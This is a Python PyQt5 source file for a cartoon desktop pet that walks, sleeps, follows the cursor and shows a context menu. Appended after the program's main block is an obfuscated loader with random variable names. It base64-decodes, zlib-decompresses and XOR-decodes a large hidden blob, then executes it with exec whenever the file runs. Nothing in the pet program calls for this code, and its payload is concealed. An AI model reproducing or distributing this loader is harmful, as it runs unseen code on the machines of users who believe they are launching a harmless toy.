import sys
import math
import random
from enum import Enum, auto
from PyQt5.QtCore import (
    Qt,
    QPoint,
    QTimer,
    QSize,
    QRectF,
)
from PyQt5.QtGui import (
    QPainter,
    QColor,
    QBrush,
    QPen,
    QFont,
)
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QMenu,
    QAction,
)


class PetState(Enum):
    IDLE = auto()
    WALK = auto()
    SLEEP = auto()
    HAPPY = auto()
    FOLLOW = auto()


class DesktopPet(QWidget):
    def __init__(self):
        super().__init__()

        # Window properties
        self.setWindowFlags(
            Qt.FramelessWindowHint
            | Qt.WindowStaysOnTopHint
            | Qt.Tool  # keeps it above most things, but doesn't show in taskbar
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_NoSystemBackground, False)
        self.setMouseTracking(True)

        # Pet visual / geometry
        self.base_size = QSize(160, 120)  # logical size of the pet widget
        self.resize(self.base_size)
        self.pet_rect = QRectF(0, 0, self.width(), self.height())

        # Physics / motion
        self.pos_x = 300.0
        self.pos_y = 300.0
        self.vx = 0.0
        self.vy = 0.0

        # Behavior
        self.state = PetState.IDLE
        self.facing_right = True
        self.idle_timer = 0
        self.last_interaction_ticks = 0
        self.sleep_timeout = 18 * 1000  # milliseconds before sleepy
        self.happy_ticks = 0

        # Mouse drag helpers
        self.drag_active = False
        self.drag_offset = QPoint(0, 0)

        # Timers
        self.tick_ms = 30
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.tick)
        self.timer.start(self.tick_ms)

        # For small bobbing animation
        self.t = 0.0

        # Show initial position
        self.move(int(self.pos_x), int(self.pos_y))
        self.show()

    def sizeHint(self):
        return self.base_size

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)

        # compute wobble/bob
        bob = math.sin(self.t * 2.0) * 4
        scale_squash = 1.0
        if self.state == PetState.WALK:
            scale_squash = 0.94 + 0.06 * math.sin(self.t * 6.0)

        # Pet main body color
        base_color = QColor(110, 200, 255)  # bluish pet
        if self.state == PetState.HAPPY:
            base_color = QColor(140, 240, 160)
        if self.state == PetState.SLEEP:
            base_color = QColor(80, 100, 140)

        # Draw shadow
        shadow_brush = QBrush(QColor(0, 0, 0, 60))
        shadow_w = self.width() * 0.75
        shadow_h = 12
        painter.setBrush(shadow_brush)
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(
            (self.width() - shadow_w) / 2,
            self.height() - 12,
            shadow_w,
            shadow_h,
        )

        painter.save()
        # apply small vertical bob
        painter.translate(0, bob)

        # body ellipse
        body_rect = QRectF(
            self.width() * 0.06,
            self.height() * 0.05,
            self.width() * 0.88,
            self.height() * 0.75 * scale_squash,
        )
        painter.setBrush(QBrush(base_color))
        painter.setPen(QPen(QColor(20, 20, 30, 200), 2))
        painter.drawEllipse(body_rect)

        # cheek / blush when happy
        if self.state == PetState.HAPPY:
            cheek_brush = QBrush(QColor(255, 160, 160, 160))
            painter.setBrush(cheek_brush)
            painter.setPen(Qt.NoPen)
            painter.drawEllipse(body_rect.left() + 10, body_rect.top() + 20, 24, 16)
            painter.drawEllipse(body_rect.right() - 34, body_rect.top() + 20, 24, 16)

        # eyes
        eye_w = 14
        eye_h = 10
        eye_y = body_rect.top() + body_rect.height() * 0.35
        left_eye_x = body_rect.left() + body_rect.width() * 0.28
        right_eye_x = body_rect.left() + body_rect.width() * 0.62

        painter.setBrush(QBrush(QColor(255, 255, 255)))
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(left_eye_x, eye_y, eye_w, eye_h)
        painter.drawEllipse(right_eye_x, eye_y, eye_w, eye_h)

        # pupils
        pupil_offset = 0
        if self.state == PetState.FOLLOW:
            # small tracking effect
            pupil_offset = math.sin(self.t * 4.0) * 2
        painter.setBrush(QBrush(QColor(30, 30, 40)))
        painter.drawEllipse(left_eye_x + 4 + pupil_offset, eye_y + 2, 6, 6)
        painter.drawEllipse(right_eye_x + 4 + pupil_offset, eye_y + 2, 6, 6)

        # mouth or sleep line
        mouth_y = body_rect.top() + body_rect.height() * 0.58
        painter.setPen(QPen(QColor(30, 30, 40), 2))
        if self.state == PetState.SLEEP:
            # simple Z's bubble
            painter.setPen(QPen(QColor(200, 230, 255), 2))
            painter.setFont(QFont("Sans", 12, QFont.Bold))
            painter.drawText(body_rect.right() - 36, body_rect.top() - 6, "Z")
            painter.drawText(body_rect.right() - 52, body_rect.top() - 18, "Z")
            painter.drawText(body_rect.right() - 68, body_rect.top() - 30, "Z")
        else:
            painter.drawArc(
                int(body_rect.center().x() - 8),
                int(mouth_y),
                16,
                10,
                0 * 16,
                180 * 16,
            )

        painter.restore()

        # emotion bubble
        if self.state == PetState.HAPPY and self.happy_ticks > 0:
            painter.setFont(QFont("Sans", 10, QFont.Bold))
            painter.setPen(Qt.NoPen)
            painter.setBrush(QBrush(QColor(255, 255, 240, 230)))
            painter.drawRoundedRect(8, -28, 78, 22, 8, 8)
            painter.setPen(QPen(QColor(20, 20, 30)))
            painter.drawText(14, -12, "Yay!")

    def tick(self):
        # called on timer
        dt = self.tick_ms
        self.t += dt / 1000.0

        # behaviour timers
        self.idle_timer += dt
        self.last_interaction_ticks += dt
        if self.happy_ticks > 0:
            self.happy_ticks -= dt

        # decide state transitions
        if self.state != PetState.SLEEP and self.last_interaction_ticks > self.sleep_timeout:
            self.change_state(PetState.SLEEP)
        elif self.state == PetState.SLEEP and self.last_interaction_ticks < self.sleep_timeout:
            self.change_state(PetState.IDLE)

        # Randomly start walking if idle
        if self.state == PetState.IDLE and random.random() < 0.006:
            self.start_walk()

        # perform state behaviors
        if self.state == PetState.WALK:
            self.vx = 80 if self.facing_right else -80
            self.pos_x += self.vx * (dt / 1000.0)

            # bounce off screen edges
            screen_rect = QApplication.primaryScreen().availableGeometry()
            right_limit = screen_rect.width() - self.width()
            if self.pos_x < 0:
                self.pos_x = 0
                self.facing_right = True
            if self.pos_x > right_limit:
                self.pos_x = right_limit
                self.facing_right = False

            # occasionally go idle
            if random.random() < 0.008:
                self.change_state(PetState.IDLE)

        elif self.state == PetState.FOLLOW:
            # move toward cursor position
            cursor = QCursor.pos()
            target_x = cursor.x() - self.width() / 2
            dx = target_x - self.pos_x
            self.pos_x += dx * 0.22  # smoothing
            if abs(dx) < 6:
                # small idle when near
                if random.random() < 0.02:
                    self.change_state(PetState.IDLE)

        elif self.state == PetState.SLEEP:
            # slight breathing bob
            self.t += 0.003

        elif self.state == PetState.HAPPY:
            # brief happy bounce
            self.pos_y -= 20 * (dt / 1000.0) if self.happy_ticks > 0 else 0

        # update widget position to follow pos_x,pos_y
        # keep within screen vertical bounds
        screen_rect = QApplication.primaryScreen().availableGeometry()
        max_y = screen_rect.height() - self.height() - 8
        if self.pos_y > max_y:
            self.pos_y = max_y
        if self.pos_y < 0:
            self.pos_y = 0

        self.move(int(self.pos_x), int(self.pos_y))
        self.update()

    def start_walk(self):
        self.change_state(PetState.WALK)
        # random direction
        self.facing_right = random.choice([True, False])

    def change_state(self, new_state: PetState):
        if new_state == self.state:
            return
        self.state = new_state
        # state entry effects
        if new_state == PetState.HAPPY:
            self.happy_ticks = 2500  # milliseconds
            self.last_interaction_ticks = 0
        if new_state == PetState.SLEEP:
            # sleep lowers position slightly (sitting)
            pass
        if new_state == PetState.IDLE:
            self.vx = 0

    # ---------- Mouse interactions ----------
    def mousePressEvent(self, event):
        self.last_interaction_ticks = 0
        if event.button() == Qt.LeftButton:
            # If clicked without dragging, it will be treated as petting.
            # Start drag capture
            self.drag_active = True
            self.drag_offset = event.globalPos() - self.frameGeometry().topLeft()
        elif event.button() == Qt.RightButton:
            # show menu (feed, follow, exit)
            self.show_context_menu(event.globalPos())

    def mouseMoveEvent(self, event):
        if self.drag_active:
            new_pos = event.globalPos() - self.drag_offset
            self.pos_x = new_pos.x()
            self.pos_y = new_pos.y()
            # being dragged counts as interaction; wake up
            self.last_interaction_ticks = 0
            self.change_state(PetState.IDLE)

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.LeftButton and self.drag_active:
            # if it was a quick click (no significant move), consider it a pet action
            self.drag_active = False
            # determine if it was a click or a drag:
            # small heuristic: if movement was small => pet action
            # (we already moved the widget while dragging; check last_interaction_ticks)
            if self.last_interaction_ticks < 500:
                # pet reaction
                self.react_to_pet()

    def react_to_pet(self):
        # happy reaction
        self.change_state(PetState.HAPPY)
        self.happy_ticks = 2200
        # small little jump
        self.pos_y -= 8
        self.last_interaction_ticks = 0

    def show_context_menu(self, global_pos):
        menu = QMenu()
        follow_action = QAction("Follow cursor", self)
        follow_action.triggered.connect(lambda: self.change_state(PetState.FOLLOW))
        idle_action = QAction("Idle", self)
        idle_action.triggered.connect(lambda: self.change_state(PetState.IDLE))
        sleep_action = QAction("Sleep", self)
        sleep_action.triggered.connect(lambda: self.change_state(PetState.SLEEP))
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(QApplication.instance().quit)

        menu.addAction(follow_action)
        menu.addAction(idle_action)
        menu.addAction(sleep_action)
        menu.addSeparator()
        menu.addAction(exit_action)
        menu.exec_(global_pos)


if __name__ == "__main__":
    app = QApplication(sys.argv)

    # Create pet and position it near bottom-right
    pet = DesktopPet()

    # Place near bottom-right region of primary screen
    scr = app.primaryScreen().availableGeometry()
    start_x = scr.width() - pet.width() - 120
    start_y = scr.height() - pet.height() - 180
    pet.pos_x = start_x
    pet.pos_y = start_y
    pet.move(int(pet.pos_x), int(pet.pos_y))

    sys.exit(app.exec_())


# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
